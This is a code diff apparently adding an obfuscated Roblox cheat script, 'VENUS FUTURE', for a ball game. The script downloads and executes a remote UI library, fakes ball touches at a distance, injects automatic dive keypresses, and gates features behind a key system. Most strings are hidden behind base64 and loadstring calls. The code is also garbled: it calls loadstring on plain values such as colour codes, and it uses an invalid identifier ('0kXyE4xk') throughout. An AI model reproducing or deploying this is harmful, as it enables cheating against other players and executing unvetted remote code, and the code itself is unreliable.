+                loadstring(base64decode("cmV0dXJuIGdhbWU6SHR0cEdldCUodXJsJSk="))(),
+                [[do
+    local _p=loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnMv"))()..url:gsub(loadstring(base64decode("JVc="))(),loadstring(base64decode("Xw=="))())..loadstring(base64decode("LnR4dA=="))()
+    if isfile and readfile and isfile(_p) then
+        local _o,_d=pcall(readfile,_p)
+        if _o and type(_d)==loadstring(base64decode("c3RyaW5n"))() and #_d>0 then return _d end
+    end
+    local _d=game:HttpGet(url)
+    pcall(function()
+        if makefolder and isfolder and not isfolder(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnM="))()) then makefolder(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnM="))()) end
+        writefile(_p,_d)
+    end)
+    return _d
+end]])
+            if n>0 and loadstring(str) then
+                if makefolder and isfolder and not isfolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) then makefolder(loadstring(base64decode("VmVudXNGdXR1cmU="))()) end
+                writefile(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnMtbWFpbi5sdWE="))(),str)
+            end
+        end)
+    end
+    if isfile and isfile(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnMtbWFpbi5sdWE="))()) then
+        local str2,n2=src:gsub('game%.HttpGet and game:HttpGet%(%w+%)or %w+:GetAsync%(%w+%)',
+            'readfile(loadstring(base64decode("VmVudXNGdXR1cmUvaWNvbnMtbWFpbi5sdWE="))())')
+        if n2>0 then src=loadstring(str2) and str2 or src end
+    end
+    lib=loadstring(src)()
+end
+
+LOADUI.step(.20,loadstring(base64decode("QXBwbHlpbmcgdGhlbWUuLi4="))())
+
+lib:AddTheme({
+    Name=loadstring(base64decode("VmVudXM="))(),
+    Background=lib:Gradient({[loadstring(base64decode("MA=="))()]={Color=Color3.fromHex(loadstring(base64decode("IzE2MTYxOQ=="))()),Transparency=0.12},[loadstring(base64decode("MTAw"))()]={Color=Color3.fromHex(loadstring(base64decode("IzE2MTYxOQ=="))()),Transparency=0.12}},{Rotation=90}),
+    Accent=lib:Gradient({[loadstring(base64decode("MA=="))()]={Color=Color3.fromHex(loadstring(base64decode("IzEwMTAxNA=="))()),Transparency=0},[loadstring(base64decode("MTAw"))()]={Color=Color3.fromHex(loadstring(base64decode("IzJhMmEzMg=="))()),Transparency=0}},{Rotation=90}),
+    Dialog=Color3.fromHex(loadstring(base64decode("IzE0MTQxOA=="))()), Outline=Color3.fromHex(loadstring(base64decode("I2M0YzRjYw=="))()),
+    Text=Color3.fromHex(loadstring(base64decode("I2YwZjBmNA=="))()), Placeholder=Color3.fromHex(loadstring(base64decode("I2ExYTFhYQ=="))()),
+    Button=Color3.fromHex(loadstring(base64decode("IzNmM2Y0Ng=="))()), Icon=Color3.fromHex(loadstring(base64decode("I2M0YzRjYw=="))()),
+    Toggle=Color3.fromHex(loadstring(base64decode("I2Q0ZDRkYw=="))()), Slider=Color3.fromHex(loadstring(base64decode("I2Q0ZDRkYw=="))()),
+    Checkbox=Color3.fromHex(loadstring(base64decode("I2Q0ZDRkYw=="))()), SliderIcon=Color3.fromHex(loadstring(base64decode("IzcxNzE3YQ=="))()),
+    Primary=Color3.fromHex(loadstring(base64decode("I2Q0ZDRkYw=="))()), PanelBackground=Color3.fromHex(loadstring(base64decode("I2M0YzRjYw=="))()),
+    PanelBackgroundTransparency=0.94, LabelBackground=Color3.fromHex(loadstring(base64decode("IzAwMDAwMA=="))()),
+    LabelBackgroundTransparency=0.8, ElementBackground=Color3.fromHex(loadstring(base64decode("IzE4MTgxYg=="))()),
+    ElementBackgroundTransparency=0.3,
+})
+lib:SetTheme(loadstring(base64decode("VmVudXM="))())
+
+LOADUI.step(.40,loadstring(base64decode("QnVpbGRpbmcgd2luZG93Li4u"))())
+
+local vp2=W.CurrentCamera and W.CurrentCamera.ViewportSize or Vector2.new(1920,1080)
+local Window=lib:CreateWindow({
+    Title=loadstring(base64decode("VkVOVVMgRlVUVVJF"))(), Icon=loadstring(base64decode("c29sYXI6cGxhbmV0LWJvbGQ="))(), Author=loadstring(base64decode("Q3VldmEgenVhIHp1YQ=="))(),
+    Folder=loadstring(base64decode("VmVudXNGdXR1cmU="))(), Theme=loadstring(base64decode("VmVudXM="))(),
+    Background=loadstring(base64decode("aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xNTM3NTg4MDI0ODk5MjgwOTU3LzE1Njc2MTQ3MjU1MDI3OTYwMDYvZmQucG5nP2V4PTZhZWNkMjdiJmlzPTZhZWI4MGZiJmhtPTllNGViOGMzYmQ3YTk0YTYwOTJjODk1OWU3NWIwMmFjZmMxYzAzOTU4NGZhZThlYTA5NmYzYWEyYmIzMGUxZjgmPSZmb3JtYXQ9d2VicCZxdWFsaXR5PWxvc3NsZXNzJndpZHRoPTg1NCZoZWlnaHQ9NDgx"))(),
+    BackgroundImageTransparency=0.35,
+    Size=UDim2.fromOffset(math.max(560,math.min(850,vp2.X-24)),math.max(350,math.min(560,vp2.Y-24))),
+    Transparent=true, Resizable=true, HideSearchBar=false,
+    ShadowTransparency=0.3, Radius=18, SideBarWidth=185,
+    Topbar={Height=56,ButtonsType=loadstring(base64decode("RGVmYXVsdA=="))()}, User={Enabled=false},
+})
+
+task.spawn(function()
+    for 0kXyE4xk=1,120 do
+        RunService.RenderStepped:Wait()
+        local main=Window.UIElements and Window.UIElements.Main
+        if main then
+            local bg2=main:FindFirstChild(loadstring(base64decode("QmFja2dyb3VuZA=="))())
+            if bg2 then
+                for _,ch in ipairs(bg2:GetChildren()) do
+                    if ch:IsA(loadstring(base64decode("SW1hZ2VMYWJlbA=="))()) and ch.Size==UDim2.new(1,0,1,0) then
+                        ch.ScaleType=Enum.ScaleType.Stretch; return end end end end end
+end)
+
+Window:Tag({Title=loadstring(base64decode("bmFjaHlwZXJyciAmIEhpaW1wYXVsNTc="))(),Icon=loadstring(base64decode("dXNlcg=="))(),Color=Color3.fromHex(loadstring(base64decode("IzJhMmEzMg=="))()),Radius=6})
+Window:Tag({Title=loadstring(base64decode("Q3VldmEgenVhIHp1YQ=="))(),Icon=loadstring(base64decode("c29sYXI6cGxhbmV0LWJvbGQ="))(),Color=Color3.fromHex(loadstring(base64decode("IzJhMmEzMg=="))()),Radius=6})
+Window:Tag({Title=loadstring(base64decode("TW9iaWxlICYgUEM="))(),Icon=loadstring(base64decode("c21hcnRwaG9uZQ=="))(),Color=Color3.fromHex(loadstring(base64decode("IzJhMmEzMg=="))()),Radius=6})
+Window:EditOpenButton({
+    Title=loadstring(base64decode("VkVOVVM="))(),Icon=loadstring(base64decode("c29sYXI6cGxhbmV0LWJvbGQ="))(),CornerRadius=UDim.new(0,16),StrokeThickness=2,
+    Color=ColorSequence.new(Color3.fromHex(loadstring(base64decode("IzJhMmEzMg=="))()),Color3.fromHex(loadstring(base64decode("I2M5YzlkNA=="))())),
+    OnlyMobile=false,Enabled=true,Draggable=true,
+})
+
+task.spawn(function()
+    for 0kXyE4xk=1,120 do
+        RunService.RenderStepped:Wait()
+        local main=Window.UIElements and Window.UIElements.Main
+        if not main then continue end
+        for _,v in ipairs(main:GetDescendants()) do
+            if v:IsA(loadstring(base64decode("VGV4dExhYmVs"))()) and v.Text==loadstring(base64decode("VkVOVVMgRlVUVVJF"))() then
+                if v:FindFirstChild(loadstring(base64decode("VmVudXNUaXRsZVNoZWVu"))()) then return end
+                local uiGrad=Instance.new(loadstring(base64decode("VUlHcmFkaWVudA=="))(),v); uiGrad.Name=loadstring(base64decode("VmVudXNUaXRsZVNoZWVu"))(); uiGrad.Rotation=12
+                uiGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(148,148,164)),ColorSequenceKeypoint.new(0.45,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(0.55,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(148,148,164))})
+                uiGrad.Offset=Vector2.new(-0.55,0)
+                local uiStroke2=Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),v); uiStroke2.Name=loadstring(base64decode("VmVudXNUaXRsZUdsb3c="))()
+                uiStroke2.Color=Color3.fromRGB(236,239,250); uiStroke2.Thickness=1.4; uiStroke2.Transparency=0.82
+                uiStroke2.ApplyStrokeMode=Enum.ApplyStrokeMode.Contextual
+                TweenService:Create(uiGrad,TweenInfo.new(2.6,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Offset=Vector2.new(0.55,0)}):Play()
+                TweenService:Create(uiStroke2,TweenInfo.new(1.7,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Transparency=0.42}):Play()
+                return
+            end
+        end
+    end
+end)
+
+LOADUI.step(.60,loadstring(base64decode("Q3JlYXRpbmcgdGFicy4uLg=="))())
+
+local IC = Color3.fromHex(loadstring(base64decode("IzZlNmU3Yg=="))())
+local TabMain     = Window:Tab({Title=loadstring(base64decode("TWFpbg=="))(),        Icon=loadstring(base64decode("c29sYXI6aG9tZS1ib2xk"))(),   IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+local TabReach    = Window:Tab({Title=loadstring(base64decode("UmVhY2g="))(),       Icon=loadstring(base64decode("bHVjaWRlOm1vdmU="))(),       IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+local TabBall     = Window:Tab({Title=loadstring(base64decode("QmFsbCBSZWFjaA=="))(),  Icon=loadstring(base64decode("bHVjaWRlOmNpcmNsZQ=="))(),     IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+local TabCatch    = Window:Tab({Title=loadstring(base64decode("QXV0byBDYXRjaA=="))(),  Icon=loadstring(base64decode("bHVjaWRlOnNoaWVsZA=="))(),     IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+local TabAntiL    = Window:Tab({Title=loadstring(base64decode("QW50aS1MYWc="))(),    Icon=loadstring(base64decode("bHVjaWRlOnphcA=="))(),        IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+local TabKeys     = Window:Tab({Title=loadstring(base64decode("S2V5YmluZHM="))(),    Icon=loadstring(base64decode("bHVjaWRlOmtleWJvYXJk"))(),   IconColor=IC, IconShape=loadstring(base64decode("U3F1YXJl"))(), Border=true})
+
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    local sg=Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
+    sg.Name=loadstring(base64decode("VkVOVVNUb2dnbGU="))(); sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true
+    sg.DisplayOrder=1000; sg.Parent=CoreGui
+    local btn=Instance.new(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(),sg)
+    btn.Size=UDim2.new(0,58,0,58); btn.Position=UDim2.new(1,-85,0,65)
+    btn.BackgroundColor3=Color3.fromRGB(10,10,10); btn.BackgroundTransparency=0.05
+    btn.Text=loadstring(base64decode("Vg=="))(); btn.TextColor3=Color3.new(1,1,1)
+    btn.Font=Enum.Font.GothamBlack; btn.TextSize=26; btn.AutoButtonColor=false
+    Instance.new(loadstring(base64decode("VUlDb3JuZXI="))(),btn).CornerRadius=UDim.new(1,0)
+    local sk=Instance.new(loadstring(base64decode("VUlTdHJva2U="))(),btn)
+    sk.Color=Color3.fromRGB(200,200,210); sk.Thickness=1.6; sk.Transparency=0.2
+    local _start,_pos,_delta=nil,nil,0
+    btn.InputBegan:Connect(function(0kXyE4xk)
+        if 0kXyE4xk.UserInputType==Enum.UserInputType.Touch or 0kXyE4xk.UserInputType==Enum.UserInputType.MouseButton1 then
+            _delta=0; _start=0kXyE4xk.Position; _pos=btn.Position end end)
+    btn.InputChanged:Connect(function(0kXyE4xk)
+        if not _start then return end
+        if 0kXyE4xk.UserInputType==Enum.UserInputType.Touch or 0kXyE4xk.UserInputType==Enum.UserInputType.MouseMove then
+            local d=0kXyE4xk.Position-_start; _delta=d.Magnitude
+            if _delta>6 then btn.Position=UDim2.new(_pos.X.Scale,_pos.X.Offset+d.X,_pos.Y.Scale,_pos.Y.Offset+d.Y) end end end)
+    btn.InputEnded:Connect(function(0kXyE4xk)
+        if 0kXyE4xk.UserInputType==Enum.UserInputType.Touch or 0kXyE4xk.UserInputType==Enum.UserInputType.MouseButton1 then
+            if _delta<=6 then pcall(function() Window:Toggle() end) end
+            _start=nil end end)
+end
+
+local VOID_MARGIN = 30
+local balls = {}
+local nearestBall = nil
+local lastBallScan = 0
+
+task.spawn(function()
+    while true do
+        task.wait(CFG.BALL_SCAN)
+        local temp = {}
+        local ok, descendants = pcall(function() return W:GetDescendants() end)
+        if ok then
+            for 0kXyE4xk = 1, #descendants do
+                local v = descendants[0kXyE4xk]
+                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and string.find(v.Name, CFG.BALL_KEYWORD, 1, true) then
+                    temp[#temp + 1] = v
+                end
+            end
+        end
+        balls = temp
+    end
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.12)
+        local c = p.Character
+        local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if not hrp or #balls == 0 then
+            nearestBall = nil
+        else
+            local hp = hrp.Position
+            local best, bestD = nil, math.huge
+            for 0kXyE4xk = 1, #balls do
+                local b = balls[0kXyE4xk]
+                if b and b.Parent and b.Position.Y > hp.Y - VOID_MARGIN then
+                    local d = (hp - b.Position).Magnitude
+                    if d < bestD then
+                        bestD = d
+                        best = b
+                    end
+                end
+            end
+            nearestBall = best
+        end
+    end
+end)
+
+local rgb = false
+local hue = 0
+local hideSphere = false
+
+local autoCatch = false
+local autoCatchRange = 16
+local autoCatchLast = 0
+
+local KB = {
+    toggleMenu = Enum.KeyCode.T,
+    kickLeft   = Enum.KeyCode.Q,
+    kickRight  = Enum.KeyCode.E,
+}
+
+local function kbName(kc)
+    return tostring(kc):gsub(loadstring(base64decode("RW51bSUuS2V5Q29kZSUu"))(),loadstring(base64decode(""))())
+end
+
+local listeningFor = nil
+local function listenNextKey(callback)
+    listeningFor = callback
+end
+
+local reachCFG = {enabled = false, size = CFG.REACH, transparency = 0.6, color = Color3.fromRGB(255,255,0)}
+local HAS_TOUCH = type(firetouchinterest) == loadstring(base64decode("ZnVuY3Rpb24="))()
+local TOUCH_PARTS = {loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(),loadstring(base64decode("UmlnaHRGb290"))(),loadstring(base64decode("TGVmdEZvb3Q="))(),loadstring(base64decode("UmlnaHQgTGVn"))(),loadstring(base64decode("TGVmdCBMZWc="))(),loadstring(base64decode("UmlnaHRIYW5k"))(),loadstring(base64decode("TGVmdEhhbmQ="))(),loadstring(base64decode("UmlnaHQgQXJt"))(),loadstring(base64decode("TGVmdCBBcm0="))()}
+
+local sphPlayer = Instance.new(loadstring(base64decode("UGFydA=="))())
+sphPlayer.Name = loadstring(base64decode("VmVudXNfUGxheWVyU3BoZXJl"))()
+sphPlayer.Shape = Enum.PartType.Ball
+sphPlayer.Anchored = true
+sphPlayer.CanCollide = false
+sphPlayer.CanTouch = false
+sphPlayer.CanQuery = false
+sphPlayer.CastShadow = false
+sphPlayer.Transparency = 1
+sphPlayer.Material = Enum.Material.SmoothPlastic
+sphPlayer.Color = reachCFG.color
+sphPlayer.Parent = W
+
+local lastTouch = 0
+local fbBall, fbOrigSize = nil, nil
+
+local function restoreFallback()
+    if fbBall and fbBall.Parent and fbOrigSize then
+        pcall(function() fbBall.Size = fbOrigSize end)
+    end
+    fbBall, fbOrigSize = nil, nil
+end
+
+local function touchBall(ball, char)
+    for 0kXyE4xk = 1, #TOUCH_PARTS do
+        local part = char:FindFirstChild(TOUCH_PARTS[0kXyE4xk])
+        if part and part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
+            firetouchinterest(part, ball, 0)
+            firetouchinterest(part, ball, 1)
+        end
+    end
+end
+
+local function stepReach()
+    if not reachCFG.enabled then
+        restoreFallback()
+        return
+    end
+    local nb = nearestBall
+    local c = p.Character
+    local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+    if not nb or not nb.Parent or not hrp then
+        restoreFallback()
+        return
+    end
+
+    if HAS_TOUCH then
+        restoreFallback()
+        if (hrp.Position - nb.Position).Magnitude <= reachCFG.size and os.clock() - lastTouch > 0.04 then
+            lastTouch = os.clock()
+            touchBall(nb, c)
+        end
+    else
+        if fbBall ~= nb then
+            restoreFallback()
+            fbBall, fbOrigSize = nb, nb.Size
+        end
+        local s = math.clamp(reachCFG.size, 1, 28)
+        nb.Size = Vector3.new(s, s, s)
+    end
+end
+
+local ballReachCFG = {
+    enabled      = false,
+    size         = 14,
+    transparency = 0.6,
+    color        = Color3.fromRGB(200, 200, 210),
+    hide         = false,
+}
+
+local sphBall = Instance.new(loadstring(base64decode("UGFydA=="))())
+sphBall.Name = loadstring(base64decode("VmVudXNfQmFsbFNwaGVyZQ=="))()
+sphBall.Shape = Enum.PartType.Ball
+sphBall.Anchored = true
+sphBall.CanCollide = false
+sphBall.CanTouch = false
+sphBall.CanQuery = false
+sphBall.CastShadow = false
+sphBall.Transparency = 1
+sphBall.Material = Enum.Material.SmoothPlastic
+sphBall.Color = ballReachCFG.color
+sphBall.Size = Vector3.new(28, 28, 28)
+sphBall.Parent = W
+
+local brLastTouch = 0
+local lastBallCFrame = CFrame.new()
+local lastBallSize = 0
+
+local function cleanupBallReach()
+    sphBall.Transparency = 1
+    sphBall.Material = Enum.Material.SmoothPlastic
+end
+
+local function stepBallReach()
+    if not ballReachCFG.enabled then
+        cleanupBallReach()
+        return
+    end
+
+    local nb = nearestBall
+    if not nb or not nb.Parent then
+        cleanupBallReach()
+        return
+    end
+
+    local radius = ballReachCFG.size
+    local newSize = radius * 2
+
+    if (nb.CFrame.Position - lastBallCFrame.Position).Magnitude > 0.15 or math.abs(newSize - lastBallSize) > 0.5 then
+        sphBall.CFrame = nb.CFrame
+        sphBall.Size = Vector3.new(newSize, newSize, newSize)
+        lastBallCFrame = nb.CFrame
+        lastBallSize = newSize
+    end
+
+    local visible = not ballReachCFG.hide
+    if visible then
+        if sphBall.Transparency ~= ballReachCFG.transparency then
+            sphBall.Transparency = ballReachCFG.transparency
+            sphBall.Material = Enum.Material.ForceField
+            sphBall.Color = ballReachCFG.color
+        end
+    else
+        if sphBall.Transparency ~= 1 then
+            sphBall.Transparency = 1
+            sphBall.Material = Enum.Material.SmoothPlastic
+        end
+    end
+
+    if HAS_TOUCH then
+        local c = p.Character
+        local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if hrp then
+            local dist = (hrp.Position - nb.Position).Magnitude
+            if dist <= radius and os.clock() - brLastTouch > 0.045 then
+                brLastTouch = os.clock()
+                touchBall(nb, c)
+            end
+        end
+    end
+end
+
+local function fireDive(key)
+    pcall(function()
+        game:GetService(loadstring(base64decode("VmlydHVhbElucHV0TWFuYWdlcg=="))()):SendKeyEvent(true, key, false, game)
+    end)
+    pcall(function()
+        if keypress then keypress(key.Value) end
+    end)
+    task.delay(0.16, function()
+        pcall(function()
+            game:GetService(loadstring(base64decode("VmlydHVhbElucHV0TWFuYWdlcg=="))()):SendKeyEvent(false, key, false, game)
+        end)
+    end)
+end
+
+local function stepAutoCatch()
+    if not autoCatch then return end
+    if os.clock() - autoCatchLast < 0.22 then return end
+
+    local nb = nearestBall
+    local c = p.Character
+    local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+    if not nb or not nb.Parent or not hrp then return end
+
+    local dist = (hrp.Position - nb.Position).Magnitude
+    if dist > autoCatchRange or dist < 3.5 then return end
+
+    local vel = nb.AssemblyLinearVelocity
+    if not vel then
+        pcall(function() vel = nb.Velocity end)
+    end
+    if not vel then return end
+
+    local toPlayer = (hrp.Position - nb.Position)
+    local speedTowards = vel:Dot(toPlayer.Unit)
+
+    if speedTowards < 14 and dist > 11 then return end
+    if speedTowards < 9 then return end
+
+    autoCatchLast = os.clock()
+
+    local relative = hrp.CFrame:PointToObjectSpace(nb.Position)
+
+    if relative.X < -1.8 then
+        fireDive(Enum.KeyCode.Z)
+    elseif relative.X > 1.8 then
+        fireDive(Enum.KeyCode.C)
+    else
+        if vel.X < 0 then
+            fireDive(Enum.KeyCode.Z)
+        else
+            fireDive(Enum.KeyCode.C)
+        end
+    end
+end
+
+local reachConn, catchConn
+
+local function startLoops()
+    if reachConn then reachConn:Disconnect() end
+    if catchConn then catchConn:Disconnect() end
+
+    reachConn = RunService.Heartbeat:Connect(function()
+        if reachCFG.enabled then
+            pcall(stepReach)
+        end
+        if autoCatch then
+            pcall(stepAutoCatch)
+        end
+    end)
+end
+
+startLoops()
+
+local hbTick = 0
+RunService.RenderStepped:Connect(function()
+    hbTick = hbTick + 1
+
+    if reachCFG.enabled then
+        local c = p.Character
+        local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if hrp then
+            sphPlayer.CFrame = CFrame.new(hrp.Position)
+            local d = reachCFG.size * 2
+            sphPlayer.Size = Vector3.new(d, d, d)
+
+            if not hideSphere then
+                if rgb then
+                    if hbTick % 4 == 0 then
+                        hue = (hue + 3) % 360
+                        sphPlayer.Color = Color3.fromHSV(hue / 360, 1, 1)
+                    end
+                else
+                    sphPlayer.Color = reachCFG.color
+                end
+                sphPlayer.Material = Enum.Material.ForceField
+                sphPlayer.Transparency = reachCFG.transparency
+            else
+                sphPlayer.Transparency = 1
+                sphPlayer.Material = Enum.Material.SmoothPlastic
+            end
+        end
+    else
+        if sphPlayer.Transparency ~= 1 then
+            sphPlayer.Transparency = 1
+            sphPlayer.Material = Enum.Material.SmoothPlastic
+        end
+    end
+
+    if ballReachCFG.enabled then
+        pcall(stepBallReach)
+    end
+end)
+
+local injecting = false
+
+local function fireGameKey(realKeyCode)
+    injecting = true
+    pcall(function()
+        game:GetService(loadstring(base64decode("VmlydHVhbElucHV0TWFuYWdlcg=="))()):SendKeyEvent(true, realKeyCode, false, game)
+    end)
+    pcall(function()
+        if keypress then keypress(realKeyCode.Value) end
+    end)
+    task.delay(0.12, function()
+        pcall(function()
+            game:GetService(loadstring(base64decode("VmlydHVhbElucHV0TWFuYWdlcg=="))()):SendKeyEvent(false, realKeyCode, false, game)
+        end)
+        injecting = false
+    end)
+end
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+
+    if listeningFor then
+        local kc = input.KeyCode
+        if kc == Enum.KeyCode.Escape or kc == Enum.KeyCode.Unknown then return end
+        local cb = listeningFor
+        listeningFor = nil
+        cb(kc)
+        return
+    end
+
+    if injecting or gpe then return end
+
+    if input.KeyCode == KB.toggleMenu then
+        pcall(function() Window:Toggle() end)
+    elseif input.KeyCode == KB.kickLeft then
+        fireGameKey(Enum.KeyCode.R)
+    elseif input.KeyCode == KB.kickRight then
+        fireGameKey(Enum.KeyCode.T)
+    end
+end)
+
+LOADUI.step(.80,loadstring(base64decode("QnVpbGRpbmcgbWVudS4uLg=="))())
+
+TabMain:Section({Title=loadstring(base64decode("Q3JlYXRvcnM="))()})
+TabMain:Paragraph({Title=loadstring(base64decode("VkVOVVMgRlVUVVJF"))(), Desc=loadstring(base64decode("bmFjaHlwZXJyciAgfCAgSGlpbXBhdWw1Nw=="))()})
+TabMain:Paragraph({Title=loadstring(base64decode("VGlrVG9r"))(), Desc=loadstring(base64decode("Tm90IGF2YWlsYWJsZQ=="))()})
+TabMain:Button({
+    Title=loadstring(base64decode("Q29weSBUaWtUb2s="))(),
+    Desc=loadstring(base64decode("Q29weSB0aGUgbGluayB0byBjbGlwYm9hcmQ="))(),
+    Icon=loadstring(base64decode("bHVjaWRlOmNvcHk="))(),
+    Callback=function()
+        if setclipboard then
+            setclipboard(CFG.TIKTOK)
+            lib:Notify({Title=loadstring(base64decode("VkVOVVM="))(), Content=loadstring(base64decode("VGlrVG9rIGxpbmsgY29waWVkLg=="))(), Duration=2, Icon=loadstring(base64decode("Y2hlY2s="))()})
+        end
+    end
+})
+
+TabMain:Divider()
+TabMain:Section({Title=loadstring(base64decode("U2Vzc2lvbiBJbmZv"))()})
+local isFounderSession = usedKeyData and usedKeyData.type == loadstring(base64decode("TElGRVRJTUU="))()
+TabMain:Paragraph({
+    Title = isFounderSession and loadstring(base64decode("8J+RkSBGb3VuZGVyIEFjY2Vzcw=="))() or loadstring(base64decode("8J+SjiBQcmVtaXVtIEFjY2Vzcw=="))(),
+    Desc = loadstring(base64decode("S2V5OiA="))() .. (usedKeyData and usedKeyData.key or loadstring(base64decode("Pw=="))()),
+})
+
+TabMain:Divider()
+TabMain:Section({Title=loadstring(base64decode("VXBkYXRlcyAmIENoYW5nZWxvZw=="))()})
+TabMain:Paragraph({
+    Title = loadstring(base64decode("TGF0ZXN0IFVwZGF0ZXM="))(),
+    Desc = loadstring(base64decode("4oCiIEJpZyBwZXJmb3JtYW5jZSBvcHRpbWl6YXRpb24gKEJhbGwgUmVhY2ggKyBSZWFjaClcbuKAoiBBdXRvIENhdGNoIHRpbWluZyBpbXByb3ZlZCAobGVzcyBlYXJseSBkaXZlcylcbuKAoiBCZXR0ZXIgZGl2ZSBkdXJhdGlvbiBzbyBjaGFyYWN0ZXIgYWN0dWFsbHkgbW92ZXNcbuKAoiBGdWxsIEVuZ2xpc2ggVUlcbuKAoiBDbGVhbmVyIGxvb3Bz"))()
+})
+
+TabMain:Divider()
+TabMain:Section({Title=loadstring(base64decode("VmlzdWFsIFNwaGVyZQ=="))()})
+TabMain:Toggle({
+    Title = loadstring(base64decode("SGlkZSBQbGF5ZXIgU3BoZXJl"))(),
+    Flag = loadstring(base64decode("dmVudXNfaGlkZV9zcGhlcmU="))(),
+    Desc = loadstring(base64decode("TWFrZXMgdGhlIHBsYXllciByZWFjaCBzcGhlcmUgaW52aXNpYmxl"))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v) hideSphere = v end
+})
+TabMain:Toggle({
+    Title = loadstring(base64decode("UkdCIE1vZGU="))(),
+    Flag = loadstring(base64decode("dmVudXNfcmdi"))(),
+    Desc = loadstring(base64decode("UmFpbmJvdyBjb2xvciBvbiB0aGUgcGxheWVyIHNwaGVyZQ=="))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v) rgb = v end
+})
+
+TabReach:Section({Title=loadstring(base64decode("Q29uZmlndXJhdGlvbg=="))()})
+TabReach:Toggle({
+    Title = loadstring(base64decode("RW5hYmxlIFJlYWNo"))(),
+    Flag = loadstring(base64decode("dmVudXNfcmVhY2hfb24="))(),
+    Desc = loadstring(base64decode("VG91Y2ggdGhlIGJhbGwgZnJvbSBhIGRpc3RhbmNl"))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v)
+        reachCFG.enabled = v
+        if not v then restoreFallback() end
+        lib:Notify({Title=loadstring(base64decode("VkVOVVM="))(), Content=loadstring(base64decode("UmVhY2gg"))()..(v and loadstring(base64decode("T04="))() or loadstring(base64decode("T0ZG"))()), Duration=1.5, Icon=v and loadstring(base64decode("Y2hlY2s="))() or loadstring(base64decode("cG93ZXItb2Zm"))()})
+    end
+})
+TabReach:Slider({
+    Title = loadstring(base64decode("U2l6ZSAoc3R1ZHMp"))(),
+    Flag = loadstring(base64decode("dmVudXNfcmVhY2hfc2l6ZQ=="))(),
+    Desc = loadstring(base64decode("UmVhY2ggcmFkaXVz"))(),
+    Step = 1,
+    Value = {Min=1, Max=50, Default=CFG.REACH},
+    Callback = function(v) reachCFG.size = v end
+})
+TabReach:Divider()
+TabReach:Section({Title=loadstring(base64decode("VmlzdWFs"))()})
+TabReach:Slider({
+    Title = loadstring(base64decode("U3BoZXJlIFRyYW5zcGFyZW5jeQ=="))(),
+    Flag = loadstring(base64decode("dmVudXNfcmVhY2hfdHJhbnM="))(),
+    Desc = loadstring(base64decode("SG93IHZpc2libGUgdGhlIHNwaGVyZSBpcw=="))(),
+    Step = 0.05,
+    Value = {Min=0, Max=1, Default=0.6},
+    Callback = function(v) reachCFG.transparency = v end
+})
+TabReach:Colorpicker({
+    Title = loadstring(base64decode("U3BoZXJlIENvbG9y"))(),
+    Flag = loadstring(base64decode("dmVudXNfcmVhY2hfY29sb3I="))(),
+    Desc = loadstring(base64decode("Q29sb3Igb2YgdGhlIHJlYWNoIHNwaGVyZQ=="))(),
+    Value = Color3.fromRGB(255,255,0),
+    Callback = function(v) reachCFG.color = v end
+})
+
+TabBall:Section({Title=loadstring(base64decode("Q29uZmlndXJhdGlvbg=="))()})
+TabBall:Toggle({
+    Title = loadstring(base64decode("RW5hYmxlIEJhbGwgUmVhY2g="))(),
+    Flag = loadstring(base64decode("dmVudXNfYmFsbF9vbg=="))(),
+    Desc = loadstring(base64decode("U3BoZXJlIGFyb3VuZCB0aGUgYmFsbCDigJQgc3RheSBpbnNpZGUgdG8gaGl0"))(),
+    Type = loadstring(base64decode("VG9nZ2xl"))(),
+    Value = false,
+    Callback = function(v)
+        ballReachCFG.enabled = v
+        if not v then cleanupBallReach() end
+        lib:Notify({Title=loadstring(base64decode("VkVOVVM="))(), Content=loadstring(base64decode("QmFsbCBSZWFjaCA="))()..(v and loadstring(base64decode("T04="))() or loadstring(base64decode("T0ZG"))()), Duration=1.5, Icon=v and loadstring(base64decode("Y2hlY2s="))() or loadstring(base64decode("cG93ZXItb2Zm"))()})
+    end
+})
+TabBall:Slider({
